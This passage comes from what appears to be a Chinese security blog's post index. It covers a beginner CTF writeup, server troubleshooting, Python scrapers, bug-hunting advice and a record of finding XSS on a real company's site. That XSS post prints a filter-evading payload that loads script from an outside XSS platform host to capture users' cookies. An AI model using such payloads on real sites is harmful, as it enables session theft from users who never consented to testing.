]\n\n参考资料：\n\n>1、https://zhuanlan.zhihu.com/p/28657325\n>2、https://blog.csdn.net/pygain/article/details/52912521\n>3、https://www.kanxue.com/book-6-110.htm\n>4、https://www.zhihu.com/question/22953267\n>5、https://blog.csdn.net/hitwangpeng/article/details/45534787\n>6、https://thief.one/2017/06/20/1/\n>7、http://blog.itpub.net/69925937/viewspace-2647388/\n>8、https://blog.csdn.net/haozhoupan/article/details/51151656\n>9、https://blog.csdn.net/qq_33571718/article/details/78373653\n>10、https://www.jianshu.com/p/43f6785e0589\n>感谢以上文章的作者，如有侵权，烦请于我的公众号TeamsSix进行私信联系。","tags":["总结","面试"],"categories":["经验总结"]},{"title":"【经验总结】VPS欠费后Hexo博客521无法访问","url":"/year/191009-164624.html","content":"# 0x00 前言\n最近自己博客的VPS欠费了，但是充值之后，启动VPS发现博客依旧无法访问，经过多次排查后，最后的结果真的是哭笑不得，下面就记录一下我最后的解决办法。\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/521_1.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/521_2.png)\n# 0x01 排查过程\n排查的过程中，碰到的第一个问题就是我发现SSH连接不上了，第一反应是博客被黑了？之后修改密码后才登上，估计只是我忘记密码了吧\n之后又发现hexo同步本地数据同步不上去，怎么搞都不行，之后过了一天，发现又可以同步了，这……玄学问题？\n直到博客无法访问第三天，我到网上四处找寻结果，还是没找到我碰到的这个问题，最后突然看到有人提到hexo使用的是nginx网页服务器，这才恍然大悟，我博客的nginx没有开！\n# 0x02 解决步骤\n直接进入自己VPS的命令行输入nginx开启nginx服务就行了，之后如果不放心可以输入netstat -ant看看自己的80端口有没有开。\n```\n[root@VPS_name ~]# nginx\n[root@VPS_name ~]# netstat -ant\n```\n# 0x03 一点思考\n讲道理，最后发现是这样的一个原因，还是挺尴尬的，博客自从搭建好后，几个月都没有碰过这些环境的问题，以前VPS重启nginx也是自动开启的，这次不知道为什么突然不行了，同时也感觉到有些东西长时间不碰，即使当初看着多么简单的东西也变难了起来。\n","tags":["VPS","Hexo","经验总结"],"categories":["经验总结"]},{"title":"【CTF】记录一次CTF比赛的Writeup","url":"/year/190925-114420.html","content":"# 0x00 前言\n最近因为省赛快来了，因此为实验室的小伙伴准备了这次比赛，总共10道题目，考虑到大多数小伙伴都刚从大一升到大二，因此整体难度不高，当然有几道难度还是有的。\n\n题目大多数都是从网上东找西找的，毕竟我也是个菜鸟呀，还要给他们出题，我太难了。\n\n废话不多说，直接上Writeup吧，以下题目的文件下载地址可以在我的公众号（TeamsSix）回复CTF获取。\n<!--more-->\n\n# 0x01 隐写 1\n```\nflag：steganoI\n\nflag格式：passwd:\n\n题目来源：http://www.wechall.net/challenge/training/stegano1/index.php\n```\n签到题，下载题目图片，利用记事本打开即可看到flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf1.png)\n\n# 0x02 隐写 2\n```\nflag：teamssix\n\nHint:一般在公共场合才能看的见\n\n题型参考：http://www.wechall.net/challenge/connect_the_dots/index.php\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf2.png)\n打开图片，参考题目提示说一般在公共场合才能看见，因此通过盲文对照表可以得出flag是teamssix，图片中的AXHU只是用来干扰的，这道题也是我参考wechall里面的一道题型。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf3.png)\n\n# 0x03 Web 1\n```\nflag:iamflagsafsfskdf11223\n\nHint:站内有提示\n\n题目地址：\nhttp://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php\n参考来源：http://hackinglab.cn/ShowQues.php?type=sqlinject\n```\n1、打开题目地址\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf4.png)\n2、查看源码找到提示\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf5.png)\n3、根据提示使用admin登陆，并使用弱密码\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf6.png)\n4、尝试多次都提示失败，利用万能密码再做尝试，找到flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf7.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf8.png)\n\n# 0x04 Web 2\n```\nflag:76tyuh12OKKytig#$%^&\n\n题目地址：http://lab1.xseclab.com/upload3_67275a14c1f2dbe0addedfd75e2da8c1/\n\nflag格式：key is :\n\n题目来源：http://hackinglab.cn/ShowQues.php?type=upload\n```\n1、打开题目地址，发现是一个文件上传界面\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf9.png)\n2、先把Burp挂上，随便上传一个JPG图片试试，并来到Burp重发这个包\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf10.png)\n3、在Burp中对文件名进行修改，比如在jpg后加上.png或者其他东西，成功看到flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf11.png)\n\n# 0x05 soeasy\n```\nflag:HackingLabHdd1b7c2fb3ff3288bff\n\nHint:在这个文件中找到key就可以通关\n\nflag格式:key:\n\n题目来源：http://hackinglab.cn/ShowQues.php?type=pentest\n```\n**解法一：**\n1、下载文件后，发现是vmdk文件，利用DeskGenius打开后，发现Key，此为正确答案\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf12.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf13.png)\n\n**解法二：**\n1、利用Vmware映射虚拟硬盘同样可以打开\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf14.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf15.png)\n\n# 0x06 Crack\n```\nflag:19940808\n\nHint:flag就是密码\n\n题目：邻居悄悄把密码改了，你只知道邻居1994年出生的，能找到她的密码吗？\n\n题目来源：http://hackinglab.cn/ShowQues.php?type=decrypt\n```\n1、下载题目文件，根据题意，需要对WiFi密码破解，而且密码很有可能是邻居的生日，因此我们利用工具生成字典。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf16.png)\n2、接下来利用ewsa进行破解，可以看到破解后的密码\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf17.png)\n这道题目当时实验室有人用kali做的，kali下的工具感觉破解速度更快。\n\n# 0x07 BiliBili\n```\nflag:Congratulations_you_got_it\n\n题目：bilibili\n\nflag格式：ctf{}\n```\n**解法一：**\n1、使用Wireshark打开数据包，直接搜索ctf\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf18.png)\n2、找到标识的那一行右击进行追踪对应的协议，比如这条是http协议就追踪http协议，之后再次查找ctf\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf19.png)\n3、发现ctf括号后的内容为base64加密，解密即可得到flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf20.png)\n**解法二：**\n1、和解法一一样，对数据包进行追踪http流，不难看出这是访问space.bilibili.com/148389186的一个数据包\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf21.png)\n2、打开这个网址，同样可以看到被base64加密的flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf22.png)\n另外打个小广告，上面这个是我的bilibili号（TeamsSix），欢迎大家关注，嘿嘿\n\n# 0x08 Check\n```\nflag:sAdf_fDfkl_Fdf\n\n题目：简单的逆向\n\nflag格式：flag{}\n\n题目来源：https://www.cnblogs.com/QKSword/p/9095242.html\n```\n1、下载文件，发现是exe文件，放到PEiD里看看有没有壳以及是什么语言编写的，如果有壳需要先脱壳。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf23.png)\n2、可以看到使用的C语言写的，同时是32位，因此使用IDA32位打开，之后找到main函数\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf24.png)\n3、按F5查看伪代码，并点击sub_401050子函数\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf25.png)\n4、不难看出下列是一个10进制到ASCII码的转换\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf26.png)\n5、利用在线网站转换即可获得flag，网站地址：[http://ctf.ssleye.com/jinzhi.html](http://ctf.ssleye.com/jinzhi.html)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf27.png)\n\n# 0x09 Android RE\n```\nflag:DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com\n\n题目：安卓逆向\n\nflag格式：DDCTF-\n\nHint:flag中包含chuxing\n\n题目来源：https://xz.aliyun.com/t/1103\n```\n1、这道题是滴滴出行的一道CTF，下载题目可以看到一个apk文件，先在模拟器中运行看看是个什么东西\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf28.png)\n2、功能很简单，一个输入框，输错会提示Wrong，那么利用Android killer给它反编译一下，查找字符“Wrong”\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf29.png)\n3、可以看到Wrong字符的路径，接下来进行反编译，不过可能由于本身软件的文件，反编译提示未找到对应的APK源码，没关系，换ApkIDE对其进行编译\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf30.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf31.png)\n4、等待一段时间后，可以看到对应源码，简单分析就可以知道该代码从hello-libs.so文件加载，并且对mFlagEntryView.getText().toString()函数的内容即我们输入的内容和stringFromJNI()函数的内容做判断，如果一致就Correct，即正确，不一致就返回Wrong，即错误，那么接下来只需要分析stringFromJNI()的内容就行了，因此我们需要知道系统从hello-libs.so文件加载了什么\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf32.png)\n5、将APK解压，找到hello-libs.so文件，由于现在手机都是用arm64位的CPU（我也不知道是不是的啊，听别人说的），因此我们找到arm64-v8a文件夹下的libhello-libs.so文件，用IDA打开\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf33.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf34.png)\n6、打开IDA后，根据题目提示，Alt +T　查找chuxing\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf35.png)\n７、成功找到flag（DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com\n）输入到模拟器中看到提示Correct，说明flag正确。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf36.png)\n# 0x10 Easy_dump\n```\nflag：F0rens1cs_St2rt\n\n题目：Easy_dump\n\nflag格式：LCTF{}\n\nHint：volatilty了解一下\n\n题目来源：https://www.tr0y.wang/2016/12/16/MiniLCTF/index.html\n```\n**解法一：**\n1、下载题目文件，提示利用volatilty工具，同时结合文件后缀为vmem（VMWare的虚拟内存文件），因此判断是一个内存取证的题目，关于volatilty的使用可以参考官方手册：[https://github.com/volatilityfoundation/volatility/wiki/Command-Reference](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference)，废话不多说，先看看镜像信息\n```\n# volatility -f xp.vmem imageinfo\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf37.png)\n2、可以看到该镜像信息的为WinXPSP2x86，接下来直接扫描查看一些系统文件中有没有flag文件\n```\n# volatility -f xp.vmem --profile=WinXPSP2x86 filescan | grep flag\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf38.png)\n3、将该flag.txt文件dump下来\n```\n# volatility -f xp.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000005ab74c8 -D ./ -u\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf39.png)\n4、直接cat flag文件即可看到flag\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf40.png)\n**解法二：**\n因为该题作者将flag复制到了自己电脑的粘贴板里的，所以直接获取粘贴板的内容也是可以看到flag的，不过谁能想到这种操作 [笑哭]\n```\n# volatility -f xp.vmem clipboard\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf41.png)\n\n以上就是本次我为他们准备的CTF的全部内容，大多数都是很基础的题目，平时拿来练练手还是不错的，拓宽一下自己的了解面，发现一些自己以前不知道的东西，如果你也想拿上面的题目来玩玩，在公众号（TeamsSix）回复CTF就可以获取下载地址哦。","tags":["比赛","CTF","Writeup"],"categories":["CTF"]},{"title":"【经验总结】记录一次Docker下安装CTFd的错误","url":"/year/190720-121144.html","content":"# 0x01 提示错误\n根据官方的步骤执行docker-compose up但是我得到了这样的一个错误\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/docker_CTFd1.png)\n```\n~/CTFd# docker-compose up\nERROR: The Compose file './docker-compose.yml' is invalid because:\nnetworks.internal value Additional properties are not allowed ('internal' was unexpected)\n```\n经过多次查询后，是因为版本问题导致，因此需要将原来的docker-compose版本卸载，安装新版本。\n# 0x02 安装新版本\n卸载docker-compose版本\n```\npip uninstall docker-compose\n```\n先升级一下pip\n```\npip install –upgrade pip\n```\n继续安装新版本\n```\npip install -U docker-compose\n```\n也可以使用国内pip源进行加速，我使用的国内源进行的安装\n```\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple -U docker-compose\n```\n之后再执行docker-compose up就没有问题了\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/docker_CTFd2.png)\n\n平时遇到问题还是需要先根据提示自己一步一步去找解决方法，之后再利用好Google。\n\n>参考文章：[https://www.ilanni.com/?p=13371](https://www.ilanni.com/?p=13371)","tags":["Docker","CTFd","环境搭建"],"categories":["经验总结"]},{"title":"分享一张超详细的渗透测试导图","url":"/year/190717-124041.html","content":"\n这是Github上看到的一张渗透测试思维导图，超级详细，在此分享。\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/渗透测试思维导图.png)\n> 图片来源地址：[https://github.com/iSafeBlue/Mind-Map](https://github.com/iSafeBlue/Mind-Map)","tags":["思维导图","渗透测试"],"categories":["资源分享"]},{"title":"【工具】批量网站CMS指纹识别","url":"/year/190715-102622.html","content":"# 0x01 概述\n* 使用Python3开发\n* 结果导出为Output_Result.csv文件\n* 使用在线平台（[http://whatweb.bugscaner.com](http://whatweb.bugscaner.com)）进行指纹识别\n* 项目下载地址：[Batch-identification-of-website-CMS-fingerprints](https://github.com/teamssix/Batch-identification-of-website-CMS-fingerprints)\n\n# 0x02 使用方法\n<!--more-->\n```\npip3 install -r requirements.txt\npython3 Batch_CMS_identification.py url.txt\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification1.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification2.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification3.png)\n# 0x03 注意事项\n* url.txt文件中地址格式需要http开头，如[http://www.teamssix.com](http://www.teamssix.com/)\n* 如果执行过程中出现警告，一般是碰到有些网站使用的https的情况，可以不用理会，对结果没有影响。\n* 如果想重新运行程序，请确认导出的CSV文件没有被打开，否则将因为不能导出文件而报错\n* 程序中途想要退出，可以直接Ctrl+C退出，等待一段时间后便会退出，结果会依然保存\n* 如果程序经常提示连接异常，可能因为对方拒绝连接或者本地网速较慢，如果本地网速延时较高，可将程序中的两处timeout调高一些，为保证速度，默认timeout为1秒。\n* 该平台每天有1500的使用限制。","tags":["Python","批量工具","指纹识别"],"categories":["资源分享"]},{"title":"【经验总结】小白挖洞十天经验分享","url":"/year/190709-202131.html","content":"\n# 0x01 前言\n十天是指六月三十号到七月九号这十天的时间，这段时间正值暑假刚开始，虽然知道现在需要备战考研，但是看了几天书后却怎么也看不进去，这时刚好有个作业就是挖洞，于是再一次把考研的书扔到了一边。\n事先声明一下，因为是小白挖洞分享，所以难免会存在错误的地方，希望多多指正与包涵。\n其实自己早在一年前就有挖洞的想法，在那个时候虽然知道很多工具的使用方法，但是对于如何挖洞依旧一头雾水，慢慢的一年的时间就在自我否定与怀疑自己中过去了，因此今天分享的第一点就是要相信自己。\n<!--more-->\n# 0x02 相信自己\n这四个字，估计每个人都听过，但是如果没有这四个字，我估计我现在还在犹豫、怀疑自己、不敢去挖洞的环境中。毕竟一件事情如果还没有去做就开始否定自己，那结局注定是失败的，连开始的勇气都没有，又怎能谈何成功。\n所以如果你现在正处在想要开始挖洞却又不知道从哪里下手的情况时，那就先打开漏洞平台，补天、漏洞盒子什么的都行，注册个账号，接下来该干什么且听我一一道来。\n# 0x03 看清自己\n这四个字，是说要明白自己有几斤几两，也就是说要有自知之明，为什么这样说呢，因为你如果上来就挖专属SRC、企业SRC的话，估计会挖到怀疑人生，所以刚开始还是先从公益SRC入手，补天上上百个公益SRC，总能找到那么几个是存在漏洞的，注意，这里说总能找到那么几个，也就是说挖不挖得着看运气咯？\n事实上，我确实是这样的，挖不挖得到完全看运气，有时运气好了，一个站碰到很多漏洞，低危、中危、高危都齐了，有时候啥也挖不到，而这种看似运气不好的时候往往占据了很大比重，但在我看来，归根结底就两点原因：一是经验不足，二是过早放弃。\n经验不足没事儿，多挖就行，时间可以解决，过早放弃却不是那么容易解决的，下面我们就来好好唠唠这点。\n# 0x04 总结记录\n这四个字，很容易理解，那和刚才说的过早放弃又有什么关系呢？\n首先我们一起来想想为什么会过早的放弃，在我看来还是不相信自己，在这个时候你已经有勇气开始挖洞了，但是在挖洞的过程中碰到了困难，所以就想到了放弃。\n打开网页看到底部的360Logo，于是关闭网页，继续下一个公益SRC；在URL参数后面加引号回车一看，知道创宇为您保驾护航，于是关闭网页，继续下一个公益SRC；突然发现有个网站存在有漏洞的CMS，于是打开hackbar，Loadurl，加上Payload，Execute执行，一顿操作猛如虎，网站却提示你提交的数据包含非法字符，于是关闭网页，继续下一个公益SRC。\n其实这就是我刚开始几天的真实写照，慢慢的发现，这样可不行，太打击人了吧，于是开始有了 自己的总结，有了自己的挖洞思路。\n我自己写的总结就是记录整个挖洞过程，不管最后有没有挖到，都给记录下来，比如先看这个网站用的什么语言、操作系统、数据库版本，之后再看这个网站有没有用CMS，接着继续记录这个网站哪里可能存在漏洞，但自己没有复现出来，又或者这个网站的登陆页面是什么，自己注册了什么账号等等，反正只要稍微有些价值的信息都给记录下来，那记录这有什么用，只是为了记录吗？当然不是，首先一点就是过几天或者过段时间之后通过之前的记录你可能会找到当时没有复现出来的漏洞，还有另外一点在我看来也是很重要的一点，就是形成自己的挖洞思路。\n在我挖了几天之后，慢慢的心中就有了一个大概的挖洞步骤，之后便记录了下来，比如刚开始我一般利用Google Hacking去收集一些网站的登陆窗口什么的，刚开始就各种弱密码碰运气，期间还真碰到一个管理员弱密码的站，之后发现有些网站公告里会提到默认密码多少多少，于是继续Google Hacking搜索网站相关的公开默认密码，又或者找到存在发送短信的地方，看看有没有短信轰炸等逻辑漏洞，之后又去批量识别网站CMS，对存在低版本的网站进行Nday攻击等等，慢慢的自己就形成了一个挖洞思路，而且随着经验的不断丰富，这样的一份漏洞挖掘思路报告也会越来越详细，说到这里，不知道你有没有想到过早放弃和总结经验之间的联系。\n当你开始总结经验的时候，开始去记录开始去总结的那一刻，如果你碰到了问题，没关系，你可以看看自己总结的挖洞思路中还有没有记录其他的方法，如果真的已经没有思路了，那也没关系，把刚才渗透这个网站获取到的信息记录下来之后，开始下一个网站的漏洞挖掘。这时你应该发现，此时已经不存在什么过早放弃的概念了，因为当记录的那一刻起，以后如果有什么新的奇淫技巧依旧可以翻翻看看，挖到高危都是没准的事儿，最后就再说一点关于学习的事儿。\n# 0x05 终身学习\n这四个字，很重要，但熟悉我的人知道，我的成绩很一般，因为我不太喜欢学习，这里说的学习是指学习自己不感兴趣的东西，而对于我自己感兴趣的东西，那可真是太喜欢了。\n这是挖洞十天经验分享，以后或许会有挖洞十月经验分享，亦或者会有挖洞十年经验分享，不管技术怎么发展变化，保持一个终身学习的心态始终不至于和时代脱节，尤其在网安的圈子，终身学习更是至关重要。如果你的兴趣不在网安，我想本文同样适用于你，不论什么领域什么方向，首先要踏出第一步，其次看清自己几斤几两，最后在不断的失败中去总结成长。\n看到现在，相信你也发现刚才说的那么多更多的是经验分享，没有太多的挖洞技巧，毕竟人家还是个小白萌新，关于挖洞技巧在我的公众号（TeamsSix）会有分享，可以关注关注，如果本视频对你有帮助，欢迎点赞收藏一键三连，好了，汤家凤、朱伟他们还等着我呢，拜拜。\n\n本文视频：\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=58541759&cid=102097106&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>\n\n如果视频不能全屏播放，请点击[源链接](https://www.bilibili.com/video/av58541759/ \"源链接\")进行观看。","tags":["经验总结","漏洞挖掘","小白"],"categories":["经验总结"]},{"title":"【渗透实例】记录一次XSS渗透过程","url":"/year/190703-221956.html","content":"\n# 0x01 找到存在XSS的位置\n没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。\n<!--more-->\n```\n使用的XSS代码：<img src=1 onerror=alert(1)>\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss1.png)\n# 0x02 构造XSS代码连接到XSS平台\nXSS平台给我们的XSS代码是这样的：\n```\n</tExtArEa>'\"><sCRiPt sRC=https://xss8.cc/3Ri4></sCrIpT>\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss2.png)\n直接插入的话会提示参数非法，经过多次尝试，最后发现该平台会对双引号、script字符进行识别过滤，大小写会被过滤，于是尝试插入下面的语句:\n```\n</tExtArEa>'\\\"><\\sCRiPt sRC=https://xss8.cc/3Ri4></\\sCrIpT>\n```\n这条代码比上面平台给的XSS代码的多了几个 \"\\\"，也就是转义字符，利用转义字符可以绕过该平台的策略，因为经验不足，所以在这一步尝试了很多种办法都没能绕过，要不有的可以插入但是连不上XSS平台，要不有的就是被识别拦截。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss3.png)\n加上转义字符成功插入后，刷新目标网站与XSS平台页面，在XSS平台就能看到刚才的访问记录。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss4.png)\n这里可以获取该登陆用户的Cookie、User-Agent、IP地址什么的，但是触发这个XSS需要登陆存在XSS的账号才行，所以个人觉着知道了这个Cookie也没啥用。\n并且虽然知道这里存在XSS，但是触发条件是需要知道用户名和密码，然后来到收货地址页面，所以个人感觉作用不大，因此在想这个漏洞还有没有其他的利用价值，后续或许会继续更新本次渗透过程，如果你有什么好的想法，欢迎下方留言。\n","tags":["渗透实例","XSS"],"categories":["渗透实例"]},{"title":"【Python实例】让Python告诉你B站观影指南","url":"/year/190619-202702.html","content":"\n# 0x00 前言\nhello大家好，这里是TeamsSix，昨天晚上11点多的突然想在B站看电影了，但是又不知道那个电影值得看，于是首先想到的是去各大影评UP主的频道里面看看，转了几圈后发现他们讲解的电影B站很多都没有，这个时候又想到了一种方法，就是在B站搜索：“在B站值得看的电影”，没想到以前还真有UP主统计过：\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie1.png)\n点进去之后发现UP主居然手动统计了160多部电影，最后他做成了一个表格，看完了之后立刻给了三连，因为在我看来每一位付出了努力与汗水的UP主都值得被尊重（疯狂暗示），事后就想到能不能用我这三脚猫的Python水平统计一下B站最值得看的电影呢？\n有了想法，立刻从床上爬了起来，在夜黑风高的晚上开始垒起了代码，终于经历了一个通宵的时间之后完成了这个想法。\n# 0x01 代码运行\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie2.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie3.png)\n>具体代码见文章底部链接\n# 0x02 运行结果\n通过刚才的运行结果，可以看到，播放数量最高的是《你的名字》，足足有一千八百多万的播放量\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie4.png)\n弹幕数量最高的还是《你的名字》，有高达98万条弹幕\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie5.png)\n硬币数量最多的依然是《你的名字》，硬币数量达到了39万个\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie6.png)\n追剧人数最高的《命运之夜--天之杯：恶兆之花》\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie7.png)\nB站评分最高的不详，因为评分最高9.9的视频比较多，所以B站评分没有统计到视频最后的汇总里\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie8.png)\n在B站的电影中豆瓣评分最高的是《武林外传》，高达9.5分\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie9.png)\nB站评分与豆瓣评分差最大的是《深夜食堂》，两个平台差了7分，这部电影我也看过，表示还阔以，不明白为什么豆瓣评分那么低。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie10.png)\nok，最后我们再来总结一下，B站的电影中播放数量、弹幕数量、硬币数量最高的均为《你的名字》，可以说是B站电影区当之无愧的C位，其余《刀剑神域：序列之争》《声之形》《白蛇：缘起》也都经常出现在前三之中。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie11.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie12.png)\n\n# 0x03 结语\n在视频的最后再简单说两句，这些数据都是可以导出为表格的，另外在写代码的中间有个小插曲，就是在获取豆瓣搜索结果中电影评分的时候，发现电影数据都是被加密的，就像这个样子\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie13.png)\n最后通过SergioJune在Github上提供的代码得以解决，在这里也向他表示感谢\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie14.png)\n\n>文章代码：https://github.com/teamssix/bilibili-movie\n\n演示视频：\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=56117996&cid=98086981&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>\n\n如果视频不能全屏播放，请点击[源链接](https://www.bilibili.com/video/av56117996/ \"源链接\")观看。","tags":["Python","电影","爬虫"],"categories":["实例演示"]},{"title":"【Python实例】让Python告诉你当前最火的电影是什么","url":"/year/190618-225704.html","content":"话不多说，先让我们看看最终效果图：\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm1.png)\n那么如何使用Python来获取这些信息呢？\n# 一、需求与思路\n# 1、需求\n首先要知道最近正在上映的电影的名称、评分、评论数等等，这些都可以在豆瓣上找得到，因此本次数据挖掘对象就确定为豆瓣电影官网。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm2.png)\n# 2、思路\na、调用requests模块向豆瓣电影官网发出请求\nb、调用BeautifulSoup模块从返回的html中提取数据\nc、调用pandas模块将提取的数据转为表格样式\n# 二、开工\n# 1、发出请求\n设置好headers,url，调用requests模块向目标网站发出请求，最后结果存储在res中\n```\nimport requests\nheaders = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}\nurl = 'https://movie.douban.com/cinema/nowplaying/beijing/'\nres = requests.get(url,headers = headers)\n```\n# 2、数据传入\n将html文本传入BeautifulSoup中，指定解析器为html.parser，并将解析内容传入soup\n```\nfrom bs4 import BeautifulSoup\nsoup = BeautifulSoup(res.text,'html.parser')\n```\n# 三、数据提取\n在介绍数据提取之前需要先介绍一个插件：infolite，这款插件可以直接查看到控件路径，而不需要到复杂的开发人员工具中就行查看。\n# 1、电影名\n打开电影详情页面，找到电影名控件路径\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm3.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm4.png)\n最终修改为以下结果得到电影名称\n```\ninsoup.select('h1')[0].text.split()[0]\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm5.png)\n# 2、豆瓣评分\n根据同样原理可得到该电影的评分\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm6.png)\n```\ninsoup.select('.rating_num')[0].text\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm7.png)\n# 3、评论数量\n依旧是一样的思路，先利用InfoLite找到控件路径，再利用bs4模块提取对应内容。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm8.png)\n```\ninsoup.select('.mod-hd a')[1].text.split()[1]\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm9.png)\n# 4、简介\n对于简介因为里面有很多空格换行等，所以这里使用了正则替换空格。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm10.png)\n```\nre.sub('\\s','',insoup.select('.related-info span')[0].text)\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm11.png)\n这里写个函数，为实现传入一个URL，返回该URL中信息的功能，最终四项都将传入result字典中，所以接下来要做的就是如何获取URL。\n```\ndef pages(url):\n    result = {}\n    inres = requests.get(url,headers = headers)\n    insoup = BeautifulSoup(inres.text,'html.parser')\n    \n    result['电影名'] = insoup.select('h1')[0].text.split()[0]\n    result['豆瓣评分'] = insoup.select('.rating_num')[0].text\n    result['评论数量'] = insoup.select('.mod-hd a')[1].text.split()[1]\n    result['简介'] = re.sub('\\s','',insoup.select('.related-info span')[0].text)\n    \n    return result\n```\n# 四、提取URL\n因为我们要找的电影是正在上映的电影，因此从正在上映的电影列表中提取URL即可。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm12.png)\n```\nurl = 'https://movie.douban.com/cinema/nowplaying/beijing/'\nres = requests.get(url,headers = 